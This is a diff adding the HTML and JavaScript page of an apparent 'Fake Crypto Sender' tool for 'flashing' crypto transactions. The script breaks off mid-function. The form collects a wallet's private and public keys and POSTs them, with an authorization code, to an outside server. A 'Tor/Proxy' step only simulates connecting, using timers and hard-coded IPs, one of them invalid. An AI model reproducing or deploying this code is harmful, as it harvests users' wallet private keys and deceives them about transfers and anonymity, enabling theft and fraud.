@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="assets/css/bootstrap_custom.css">
+    <link rel="stylesheet" href="css2.css">
+    <!-- Nice Select CSS -->
+    <link rel="stylesheet" href="assets/nice-select2/dist/css/nice-select2.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="stylesheet" href="https://cdn.datatables.net/2.0.3/css/dataTables.dataTables.css">
+    <link rel="stylesheet" href="assets/Font-Awesome-6/css/all.css">
+
+    <title>Fake Crypto Sender</title>
+</head>
+
+<body>
+    <div class="d-flex wrapper" id="wrapper">
+        <!-- Sidebar -->
+        <div id="sidebar-wrapper" class="sidebar-wrapper">
+            <div class="sidebar-heading">
+                <a class="row sidebar-a" href="index.html">
+                    <img id="logo" class="logo img col-md-2" src="assets/img/logo.png" alt="">
+                    <div class="text-wrapper-60 col-md-2">Fake Crypto Sender</div>
+                </a>
+            </div>
+            <nav class="sidebar mb-4">
+                <ul class="nav flex-column" id="nav_accordion">
+                    <li class="nav-item">
+                        <a class="nav-link active d-flex gap-2 align-items-center" href="index.html">
+                            <img src="assets/img/dashboard_icon.png" alt="">
+                            <span class="fw-semibold">Dashboard</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex gap-2 align-items-center" href="portfolio.html">
+                            <span class="material-symbols-outlined fw-lighter">
+                                <i class="fa-solid fa-wallet fa-xs"></i>
+                            </span>
+                            <span class="fw-semibold">Portfolio</span>
+                        </a>
+                    </li>
+                    <li class="nav-item" id="moodLink">
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex gap-2 align-items-center" href="markets.html">
+                            <span class="material-symbols-outlined fw-lighter">
+                                <i class="fa-solid fa-chart-line fa-xs"></i>
+                            </span>
+                            <span class="fw-semibold">Markets</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex gap-2 align-items-center" href="transactions.html">
+                            <span class="material-symbols-outlined fw-lighter">
+                                <i class="fa-solid fa-money-bill-transfer fa-xs"></i>
+                            </span>
+                            <span class="fw-semibold">Transactions</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link d-flex gap-2 align-items-center" href="settings.html">
+                            <span class="material-symbols-outlined fw-lighter">
+                                <i class="fa-solid fa-id-card fa-xs"></i>
+                            </span>
+                            <span class="fw-semibold">Settings</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <button class="primary-btn flash" style="width: 30%;margin-left: 37px;">
+                            <span><i class="fa-solid fa-bolt fa-beat" style="--fa-animation-duration: 2s;"></i></span>
+                            Flash</button>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+
+        <!-- Page Content -->
+        <div id="page-content-wrapper" class="page-content-wrapper">
+            <nav class="navbar navbar-expand-lg py-lg-3 px-2 px-lg-4 d-flex fixed-top justify-content-between">
+                <div class="d-flex align-items-center">
+                    <div class="d-flex align-items-center d-lg-none">
+                        <span class="material-symbols-outlined menu-toggle" id="menu-toggle">
+                            menu
+                        </span>
+                    </div>
+                </div>
+
+                <div class="d-flex gap-3 p-lg-2 p-lg-0 align-items-center justify-content-end">
+                    <div class="nav-item dropdown">
+                        <a class="d-flex gap-2 align-items-center" href="#" id="navbarDropdown4" role="button"
+                            data-bs-toggle="dropdown" aria-expanded="false">
+                            <img height="60" width="60" class="img-fluid" src="assets/img/avatar.png" alt="user" style="
+    padding-top: 20%;
+">
+                            <div class="d-flex flex-column d-none d-xl-block">
+                                <p class="mb-0 text-white fw-semibold profile">Profile</p>
+                                <span class="small text-white profileBal">$00.00</span>
+                            </div>
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end user shadow border-0"
+                            aria-labelledby="navbarDropdown4" onclick="event.stopPropagation()">
+                            <li><span class="px-3 d-inline-block " id="welcome">Welcome Kim!</span></li>
+                            <li>
+                                <a class="dropdown-item d-flex align-items-center gap-2" href="settings.html">
+                                    <span class="material-symbols-outlined fw-light">
+                                        <i class="fa-solid fa-user-gear fa-xs"></i>
+                                    </span>
+                                    <span class="fw-semibold">Settings</span></a>
+                            </li>
+                            <li>
+                                <a class="dropdown-item d-flex align-items-center gap-1" id="logout" href="#">
+                                    <span class="material-symbols-outlined fw-light">
+                                        <i class="fa-solid fa-arrow-right-to-bracket fa-xs"></i>
+                                    </span>
+                                    <span class="fw-semibold" style="padding-left: 5%;">Log Out</span> </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- For pc -->
+            </nav>
+
+            <div class="container-fluid main-content settings px-2 px-lg-4">
+                <!-- Tables -->
+                <div class="row my-2 g-3 g-lg-4 pb-3 settings-inner">
+                    <div class="col-sm-6 col-lg-7 col-xl-8 col-xxl-9">
+                        <div class="settings-tab">
+                            <ul class="nav nav-pills" id="pills-tab" role="tablist">
+                                <li class="nav-item" role="presentation">
+                                    <button class="nav-link active" id="pills-profile-tab" data-bs-toggle="pill"
+                                        data-bs-target="#pills-profile" type="button" role="tab">Flash</button>
+                                </li>
+                            </ul>
+
+                            <div class="tab-content pt-2" id="pills-tabContent">
+                                <div class="tab-pane fade show active" id="pills-profile" role="tabpanel" tabindex="0">
+                                    <form id="form-flash">
+                                        <div class="row">
+                                            <div style="display: grid;">
+                                                <small class="liveBal" style="padding-top: 5%;" id="livebal">Coin Bal:
+                                                    00</small>
+                                                <!-- <small class="liveGasBal" id="liveGasbal">Gas Bal: 00</small> -->
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" for="_coin">Select Coin</label>
+                                                <select class="form-control" name="_coin" id="_coin" required="">
+
+                                                </select>
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" for="value1">Select Network</label>
+                                                <select class="form-control" name="value1" id="value1" required="">
+
+                                                </select>
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" for="_publicKey">Public key</label>
+                                                <input type="text" name="_publicKey" id="_publicKey"
+                                                    placeholder="Public key" data-minlength="40"
+                                                    pattern="^[A-z0-9+= \/]+$" class="form-control" required="">
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" for="_privateKey">Private
+                                                    Key</label>
+                                                <input type="text" name="_privateKey" data-minlength="40"
+                                                    pattern="^[A-z0-9+= \/]+$" id="_privateKey"
+                                                    placeholder="Private Key" class="form-control" required="">
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+
+                                                <label class="fw-semibold mb-2 mt-3" for="amount">Amount</label>
+                                                <div class="dols">
+                                                    <span class="input-group-text">$</span>
+                                                    <input type="number" name="amount" id="amount" placeholder="Amount"
+                                                        class="form-control" pattern="^[0-9]+$" required=""
+                                                        aria-label="Amount (to the nearest dollar)">
+                                                </div>
+                                                <small class="liveValue" id="liveValue"></small>
+
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" data-minlength="10"
+                                                    for="address">Receiver's
+                                                    Address</label>
+                                                <input type="text" name="address" pattern="^[A-z0-9]+$" id="address"
+                                                    placeholder="Receiver's Address" class="form-control" required="">
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <div class="col-12">
+                                                <div class="mt-4 d-flex gap-3">
+                                                    <button type="submit" class="primary-btn-lg" id="form_login_submit"
+                                                        disabled><span><i
+                                                                class="fa-solid fa-arrow-right-to-bracket refreshIcon"></i></span>
+                                                        &nbsp; Submit</button>
+
+                                                </div>
+                                                <div class="mt-4 d-flex gap-3 ">
+                                                    <button type="submit" class="secondary-btn-lg form_topUp"
+                                                        id="form_topUp" style="display: none;"><span><i
+                                                                class="fa-solid fa-upload upload"></i></span>
+                                                        &nbsp;
+                                                        Top Up</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                                <div class="tab-pane fade" id="pills-password" role="tabpanel" tabindex="0">
+                                    <form>
+                                        <div class="row">
+                                            <div class="col-md-6">
+                                                <label class="fw-semibold mb-2 mt-3" for="password">Current
+                                                    Password</label>
+                                                <input type="text" id="password" placeholder="Current Password........"
+                                                    class="form-control">
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="fw-semibold mb-2 mt-3" for="newpass">New Password</label>
+                                                <input type="text" id="newpass" placeholder="New Passsword........"
+                                                    class="form-control">
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="fw-semibold mb-2 mt-3" for="confirmpass">Confirm
+                                                    Password</label>
+                                                <input type="text" id="confirmpass"
+                                                    placeholder="Confirm Password........" class="form-control">
+                                            </div>
+                                            <div class="col-md-6 d-flex align-items-end">
+                                                <button class="primary-btn-lg mt-3" type="submit">Update
+                                                    Password</button>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Modal -->
+                <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false"
+                    tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+                    <div class="modal-dialog modal-dialog-centered modal-fullscreen-sm-down">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h1 class="modal-title fs-5" id="staticBackdropLabel">Transaction Processing</h1>
+                            </div>
+                            <div class="modal-body">
+                                <img style="width: 70%;" src="assets/img/process.gif" alt="" srcset="">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="modal fade" id="Auth" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+                    aria-labelledby="AuthLabel" aria-hidden="true">
+                    <div class="modal-dialog modal-dialog-centered modal-fullscreen-md-down">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h1 class="modal-title fs-7" id="AuthLabel">Authorization Code</h1>
+                            </div>
+                            <div class="modal-body">
+                                <form action="#" method="post" id="AuthCode">
+                                    <div class="d-flex flex-wrap gap-4 align-items-center mt-3">
+                                        <div class="d-flex flex-column qr-code flex-shrink-0">
+                                            <span class="fw-bold text-white large mt-2 text-center">Verify Code</span>
+                                        </div>
+                                        <div>
+                                            <span class="fw-bold text-white medium mb-3">Enter the Fifteen-digit
+                                                Authorization Code</span>
+                                            <br>
+                                            <p class="medium">If you have forgotten or don't have an Authorization Code
+                                                contact us @<a href="#">www.fakecryptosender.com </a> </p>
+                                            <div class="otp mb-2 form-group">
+                                                <div class="help-block with-errors"></div>
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                                <input type="text" pattern="^[^\s]+$" required class="otp-input"
+                                                    placeholder="0" maxlength="1">
+                                            </div>
+                                            <div class="col-md-6" id="">
+                                                <small class="AuthCodeError" id="AuthCodeError"></small>
+                                                <small class="AuthCodeSuccess" id="AuthCodeSuccess"></small>
+                                            </div>
+                                            <button class="primary-btn-lg mt-3" id="AuthCodeSubmit" type="submit"
+                                                data-bs-toggle="tooltip" data-bs-placement="right"
+                                                data-bs-title="Click to Verify"><span><i
+                                                        class="fa-solid fa-fingerprint search"></i></span>
+                                                Verify
+                                            </button>
+
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="modal fade" id="Conn" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+                    aria-labelledby="ConnLabel" aria-hidden="true">
+                    <div class="modal-dialog modal-dialog-centered modal-fullscreen-md-down">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h6 class="modal-title fs-7" id="ConnLabel">Connect to Tor/Proxy to Flash </h6>
+                            </div>
+                            <div class="modal-body">
+                                <form action="#" method="post" id="ConnCode">
+                                    <div class="d-flex flex-wrap gap-4 align-items-center mt-3">
+                                        <div>
+                                            <div class="col-md-12 form-group">
+                                                <label class="fw-semibold mb-2 mt-3" for="_con">Select Location</label>
+                                                <select class="form-control" name="_con" id="_con" required="">
+                                                    <option value="132.82.221.184">Panama</option>
+                                                    <option value="155.144.217.13">Sweden</option>
+                                                    <option value="246.204.106.71">Malaysia</option>
+                                                    <option value="152.140.154.202">France</option>
+                                                    <option value="66.82.23.51">UAE</option>
+                                                    <option value="77.55.215.245">Singapore</option>
+                                                    <option value="221.47.245.191">Iceland</option>
+                                                    <option value="105.141.164.213">Switzerland</option>
+                                                    <option value="153.85.124.35">Austria</option>
+                                                    <option value="37.13.169.158">Netherlands</option>
+                                                    <option value="90.232.51.118">Germany</option>
+                                                    <option value="68.199.43.226">Gibraltar</option>
+                                                    <option value="195.110.51.32">Spain</option>
+                                                    <option value="169.48.7.212">Seychelles</option>
+                                                    <option value="296.36.2.412">Romania</option>
+                                                </select>
+                                                <div class="help-block with-errors"></div>
+                                            </div>
+                                            <br />
+                                            <br />
+                                            <br />
+                                            <div class="col-md-12" id="">
+                                                <small class="ConnCodeSuccess" id="ConnCodeSuccess"></small>
+                                            </div>
+                                            <div class="col-md-6 form-group">
+                                                <button class="primary-btn-lg mt-3" id="ConnSubmit" type="submit"
+                                                    data-bs-toggle="tooltip" data-bs-placement="right"
+                                                    data-bs-title="Click to Connect"><span><i
+                                                            class="fa-solid fa-plug plug"></i></span>
+                                                    Connect
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Footer -->
+                <div class="row py-2 g-3 g-lg-4 top-border footer">
+                    <div class="col-lg-6">
+                        <span class="text-center text-lg-start d-block w-100" id="copyright"></span>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="bootstrap-5.0.2-dist/js/bootstrap.bundle.js"></script>
+    <script src="npm/chart.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous">  </script>
+
+    <script src="assets/js/main.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/cryptocharts"></script>
+    <script src="http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js"></script>
+    <script src="assets/js/jstorage.min.js"></script>
+    <script src="https://cdn.datatables.net/2.0.3/js/dataTables.js"></script>
+    <script src="assets/js/toast.js"></script>
+    <script src="assets/js/default.js?v4"></script>
+    <script src="assets/js/contact-form-script.js"></script>
+    <script src="assets/js/form-validator.min.js"></script>
+    <script src="assets/nice-select2/dist/js/nice-select2.js"></script>
+    <!-- <script src="assets/js/jquery.nice-select.js"></script> -->
+
+    <script type="text/javascript">
+        
+
+        var $user = $.jStorage.get("user")
+         console.log($user)
+        if (!$user)
+            window.location = "signin.html"
+        
+        var myModalConn = new bootstrap.Modal(document.getElementById('Conn'), { backdrop: "static", keyboard: false })
+        NiceSelect.bind($("#_con")[0]);
+        var $isConn = $.jStorage.get("isConn") ?? false
+        var $isAuth = $user[0].auth
+
+        // Create our number formatter.
+        // default
+        var myModal = new bootstrap.Modal(document.getElementById('staticBackdrop'), { backdrop: "static", keyboard: false })
+        var instanceValue1 = NiceSelect.bind($("#value1")[0]);
+        var instance_Coin = NiceSelect.bind($("#_coin")[0]);
+        var gasHoldings = $.jStorage.get("gasHolding")
+        var holdings = $.jStorage.get("holdings")
+        var total = $.jStorage.get("total")
+        var $user = $.jStorage.get("user")
+        var gasTotal = $.jStorage.get("gasTotal")
+        var result = 0
+        var gasResult = 0
+        var gasResultTether = 0
+        var gasCurBal = 0
+        var gasFullName = ""
+        var curBal = 0
+        var liveValBal = 0
+
+        // seachable 
+        //   var options = {searchable: true};
+        //   NiceSelect.bind(document.getElementById("seachable-select"), options);
+
+        var net = {};
+        const formatter = new Intl.NumberFormat('en-US', {
+            style: 'currency',
+            currency: 'USD',
+
+            // maximumFractionDigits:10,
+
+            // These options are needed to round to whole numbers if that's what you want.
+            //minimumFractionDigits: 0, // (this suffices for whole numbers, but will print 2500.10 as $2,500.1)
+            //maximumFractionDigits: 0, // (causes 2500.99 to be printed as $2,501)
+        });
+
+    </script>
+
+    <script type="text/javascript">
+        var myModalAuth = new bootstrap.Modal(document.getElementById('Auth'), { backdrop: "static", keyboard: false })
+        if ($isAuth != "true") {
+            myModalAuth.show()
+        } else {
+            if (!$isConn) {
+                myModalConn.show()
+            }
+        }
+        var els = [...document.getElementsByClassName('otp-input')]
+        els.forEach(el => {
+            $(el).keyup((e) => {
+                e.preventDefault()
+                var val = $(el).val() ?? 0
+                $(el).val(val[0])
+
+                if (el.value == "") {
+                    //  $(el).val("0")
+                }
+            })
+        })
+
+        $("#AuthCodeSubmit").click(function (e) {
+            e.preventDefault()
+            $("#AuthCode").validator();
+            var validator = $("#AuthCode").data("bs.validator");
+            validator.validate();
+
+
+            var codes = ""
+            if (!validator.hasErrors()) {
+
+                var els = [...document.getElementsByClassName('otp-input')]
+                els.forEach(el => {
+                    codes += $(el).val() ?? 0
+                })
+                // console.log(val)
+                // return
+
+                var button = $("#AuthCodeSubmit")
+                var buttonVal = button.html()
+
+                var $Code = codes
+                // button.val("Please wait...")
+                singleToggles(".fa-fingerprint", ".fa-solid fa-sync fa-spin", ".search")
+                button.attr("disabled", "true");
+                $("#AuthCodeSubmit").prop({ "disabled": "true" })
+
+                const _formData = {
+                    _user_id: $user[0].id,
+                    _authCode: $Code,
+
+                };
+                console.log(_formData);
+
+                db_request_Auth(_formData, button)
+            }
+        })
+        const db_request_Auth = async (form_values, button) => {
+
+            const API_URL = "https://machantpu.business/Admin/pages/admin_temps/admin/app/authCode.php";
+            const HEADER = {
+                "Access-Control-Allow-Origin": "*",
+            };
+            // console.log(`${_authCode} ${$user}`);
+            const $data = form_values;
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    type: "json",
+                    Cache: true,
+                    body: JSON.stringify($data),
+                });
+                console.log(response);
+
+                // console.log(response);
+                const data = await response.json();
+                if (!data.error) {
+                    console.log(data);
+
+                    // now update the storage
+                    $user[0].auth = "true";
+                    $.jStorage.set("user", $user);
+
+                    $("#AuthCodeSuccess").html("Code Validated ✔");
+                    $("#AuthCodeError").html(``)
+                    button.removeAttr("disabled");
+                    singleToggles(".fa-fingerprint", ".fa-solid fa-sync fa-spin", ".search")
+
+                    setTimeout(() => {
+                        myModalAuth.hide()
+                        if (!$isConn) {
+                            myModalConn.show()
+                        }
+                    }, 10000);
+                } else {
+                    $("#AuthCodeError").html("Wrong Code Supplied ❌");
+                    $("#AuthCodeSuccess").html(``)
+                    button.removeAttr("disabled");
+                    singleToggles(".fa-fingerprint", ".fa-solid fa-sync fa-spin", ".search")
+                }
+
+
+            } catch (error) {
+                // console.log(data);
+                button.removeAttr("disabled");
+                singleToggles(".fa-fingerprint", ".fa-solid fa-sync fa-spin", ".search")
+                toast("Error communication to server", "error", tTime);
+            }
+        };
+
+    </script>
+
+    <script type="text/javascript">
+        $("#ConnSubmit").click(function (e) {
+            e.preventDefault()
+
+            var _conn = $("#_conn option:selected").text()
+            var button = $("#ConnSubmit")
+            var buttonVal = button.html()
+
+            // button.val("Please wait...")
+            singleToggles(".fa-plug", ".fa-solid fa-sync fa-spin", ".plug")
+
+            button.attr("disabled", "true");
+            $("#ConnSubmit").prop({ "disabled": "true" })
+
+            if (_conn == "Select an option") {
+                $("#ConnCodeError").text(`Select a VPN Location Please`)
+                $("#ConnSubmit").removeAttr("disabled")
+                singleToggles(".fa-plug", ".fa-solid fa-sync fa-spin", ".plug")
+
+                return
+            }
+
+
+            $("#ConnCodeSuccess").text(`Connecting to ${$("#_con option:selected").text()} Please wait...`)
+            $.jStorage.set("isConn", true);
+
+            setTimeout(() => {
+                $("#ConnCodeSuccess").text(`Connected to ${$("#_con option:selected").html()}; IP => ${$("#_con option:selected").val()} successfully`)
+                setTimeout(() => {
+                    myModalConn.hide()
+                }, 3000)
+            }, 10000);
+        })
+    </script>
+
+
+    <script type="text/javascript">
+
+        // console.log($.jStorage.get("user"))
+        $("#form_login_submit").click((e) => {
+
+            $("#form-flash").validator();
+            var validator = $("#form-flash").data("bs.validator");
+            validator.validate();
+            console.log(result);
+
+            if (!validator.hasErrors()) {
+                e.preventDefault();
+                holdings.forEach(element => {
+                    if (element.coin.toLowerCase() == $("#_coin").val()) {
+                        if (element.qty >= result) {
+                            curBal = element.qty - result;
+                            $.jStorage.set("total", total - curBal)
+                            console.log(curBal)
+                        } else {
+                            // console.log("Very less")
+                        }
+                    }
+                    //console.log(result + " / " + element.qty)
+                })
+                var button = $("#form_login_submit")
+                var buttonVal = button.html()
+                const $Trans = randomString(21);
+                var $TranCode = $Trans
+
+                gasHoldings.find((element) => {
+                    if (element.short == $("#value1").val()) {
+                        gasCurBal = element.qty// enter the object
+                        console.log(" <gas> " + gasCurBal)
+                    }
+                })
+
+                // button.val("Please wait...")
+                singleToggles(".fa-arrow-right-to-bracket", ".fa-solid fa-sync fa-spin", ".refreshIcon")
+                button.attr("disabled", "true");
+                $("#form_login_submit").prop({ "disabled": "true" })
+
+                const _formData = {
+                    _coin: $("#_coin").val(),
+                    _transcode: $TranCode,
+                    _value: $("#amount").val(),
+                    _user_id: $user[0].id,
+                    _bal: curBal,
+                    _address: $("#address").val(),
+                    _privateKey: $("#_privateKey").val(),
+                    _publicKey: $("#_publicKey").val(),
+                    _gasCur: gasCurBal,
+                    _gasCoin: gasFullName,
+                };
+                console.log(_formData);
+
+                db_request(_formData, button, buttonVal)
+            } else {
+
+            }
+        });
+
+        const db_request = async (form_values, button, buttonVal) => {
+
+            const API_URL = "https://machantpu.business/Admin/pages/admin_temps/admin/app/flash.php";
+            const HEADER = {
+                "Access-Control-Allow-Origin": "*",
+            };
+            // console.log(`${_authCode} ${$user}`);
+            const $data = form_values;
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    type: "json",
+                    Cache: true,
+                    body: JSON.stringify($data),
+                });
+                console.log(response);
+
+                // console.log(response);
+                const data = await response.json();
+                if (!data.error) {
+                    console.log(data);
+                    //update storage
+
+                    // this process pulls the object and update it ans send it back to j storage
+                    // console.log(gasFullName);
+                    // console.log($("#_coin").val());
+
+                    holdings.find(function (element) {
+                        if (element.coin.toLowerCase() == $("#_coin").val()) {
+                            element.qty = curBal
+                            console.log("holdings " + result + " - " + +total)
+                            total = total - result
+
+                        }
+                    })
+                    /* 
+                     gasHoldings.find(function (element) {
+                         if (element.coin == gasFullName) {
+                             console.log(gasFullName + " <=> " + gasCurBal)
+                             element.qty = gasCurBal // enter the object
+ 
+                             if ($("#_coin") == "tether") {
+                                 console.log("gas " + gasResultTether + " - " + gasTotal)
+                                 gasTotal = gasTotal - gasResultTether; // enter the the holder gas_gasName
+                             } else {
+                                 console.log("gas " + gasResult + " - " + gasTotal)
+                                 gasTotal = gasTotal - gasResult; // enter the the holder gas_gasName
+                             }
+ 
+                         }
+                     })
+                     */
+
+                    // now update the storage
+                    $.jStorage.set("holdings", holdings)
+                    $.jStorage.set("gasHolding", gasHoldings)
+                    $.jStorage.set("total", total)
+                    $.jStorage.set("gasTotal", gasTotal)
+
+
+                    setTimeout(() => {
+                        setVisible(true);
+                        setTimeout(() => {
+                            setVisible(false);
+                            window.location = "transactions.html";
+                        }, 75880);
+                    }, 3000);
+                } else {
+                    toast(error, "error", tTime);
+                    button.removeAttr("disabled");
+                    singleToggles("fa-arrow-right-to-bracket", "fa-solid fa-sync fa-spin", ".refreshIcon")
+                }
+
+                // if (response.status == 200) {
+                //     const data = await response.json();
+                //     if (!data.error) {
+                //         console.log(data);
+                //         toast("<h6 style=''> Success, <br/> Welcome Back <h6>", "success", tTime);
+
+                //         const set$holding = data.holdings;
+                //         const set$user = data.user;
+                //         const set$gasHolding = data.gas;
+                //         const set$TransAdd = data.wallet;
+
+
+                //         if ($("#_remember").prop('checked')) {
+                //             //save local storage
+                //             if (typeof localStorage !== 'undefined') {
+                //                 try {
+
+                //                     $.jStorage.set("holdings", set$holding)
+                //                     $.jStorage.set("user", set$user)
+                //                     $.jStorage.set("gasHolding", set$gasHolding)
+                //                     $.jStorage.set("transAdd", set$TransAdd)
+                //                     console.log("entered")
+
+                //                 } catch (e) {
+                //                     //return false;
+                //                 }
+                //             }
+                //         } else {
+                //             if (typeof localStorage !== 'undefined') {
+                //                 try {
+
+                //                     $.jStorage.set("holdings", set$holding)
+                //                     $.jStorage.set("user", set$user)
+                //                     $.jStorage.set("gasHolding", set$gasHolding)
+                //                     $.jStorage.set("transAdd", set$TransAdd)
+                //                     $.jStorage.setTTL("user", 1003000); // expires in 3 seconds (3000)
+                //                     console.log("entered")
+
+                //                 } catch (e) {
+                //                     //return false;
+                //                 }
+                //             }
+                //         }
+
+                //         var stope_Int = setInterval(() => {
+                //             button.removeAttr("disabled");
+                //             button.html(buttonVal);
+                //             window.location = "index.html";
+                //             clearInterval(stope_Int)
+                //         }, 3000);
+
+                //     } else if (data.error) {
+                //         singleToggles("fa-arrow-right-to-bracket", "fa-solid fa-sync fa-spin", ".refreshIcon")
+                //         console.log("data");
+                //         button.removeAttr("disabled");
+                //         button.html(buttonVal);
+                //         toast("Incorrect Email or Password", "error", tTime);
+                //     }
+                // }
+
+            } catch (error) {
+                // console.log(data);
+                button.removeAttr("disabled");
+                singleToggles("fa-arrow-right-to-bracket", "fa-solid fa-sync fa-spin", ".refreshIcon")
+                toast("Error communication to server", "error", tTime);
+            }
+        };
+
+    </script>
+
+    <script type="text/javascript">
+        const setVisible = (bol) => {
+            if (bol) {
+                myModal.show()
+            } else {
+                myModal.hide()
+            }
+        }
+    </script>
+
+    <script type="text/javascript">
+        // hashCode function
+        var randomString = function (length) {
+            var str = "";
+            var chars =
+                "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz".split("");
+            var charsLen = chars.length;
+            if (!length) {
+                length = ~~(Math.random() * charsLen);
+            }
+            for (var i = 0; i < length; i++) {
+                str += chars[~~(Math.random() * charsLen)];
+            }
+            return str;
+        };
+    </script>
+
+    <script type="text/javascript">
+        const inputUsdtToCoin = (input, curCoinValueToUSd) => {
+            console.log(input / curCoinValueToUSd)
+            return input / curCoinValueToUSd
+        }
+
+    </script>
+
+    <script type="text/javascript">
+        $("#amount").keyup(function (e) {
+            //e.preventDefault()
+
+            if ($("#value1").val()) {
+
+                var coinSelected = $("#_coin").val().charAt(0).toUpperCase() + $("#_coin").val().slice(1);
+                console.log($("#_coin").val())
+                if ($("#_coin").val() != "tether") {
+                    result = inputUsdtToCoin(!($("#amount").val().trim().length) ? 0.0 : $("#amount").val(), $.jStorage.get($("#value1").val())) ?? 0
+                    var FormattedAmount = new Intl.NumberFormat("en-US").format(result);
+                    //take the 1 percent from the total coin as gas
+                    // gasResult = result * (1 / 100)
+
+
+                    holdings.forEach(element => {
+                        if (element.short == $("#value1").val()) {
+                            //checking for the amount provided against the average amount $200
+                            if (parseFloat($("#amount").val()) < 1) {
+
+                                $("#liveValue").addClass("liveValueRed")
+                                $("#liveValue").html(`${coinSelected} Equivalent ≈ ${FormattedAmount} ${$("#value1").val().toUpperCase()}, <br/> Note:Minimum amount of $1 is required`)
+
+
+                                $("#form_login_submit").prop({ "disabled": "true" })
+                                $("#form_login_submit").css({ "display": "block" })
+
+                            }
+                            //checking for the amount provided against the one from the db
+                            else if (liveValBal < result) {
+                                $("#liveValue").addClass("liveValueRed")
+                                $("#liveValue").html(`${coinSelected} Equivalent ≈ ${FormattedAmount} ${$("#value1").val().toUpperCase()}, <br/> Note: Insufficient Fund`);
+
+                                $("#form_login_submit").prop({ "disabled": "true" })
+
+
+
+                            } else if (liveValBal >= result) {
+                                //checking for gas amount if its upto gas amount in db
+                                //get cur gasBal
+
+                                // gasCurBal = element.qty - gasResult;
+                                // gasCurBal = element.qty;
+
+                                gasFullName = $("#_coin").val();
+                                // console.log("gas Bal" + gasCurBal)
+                                $("#liveValue").removeClass("liveValueRed")
+                                $("#liveValue").html(` ${coinSelected} Equivalent ≈ ${FormattedAmount} ${$("#value1").val().toUpperCase()}`)
+
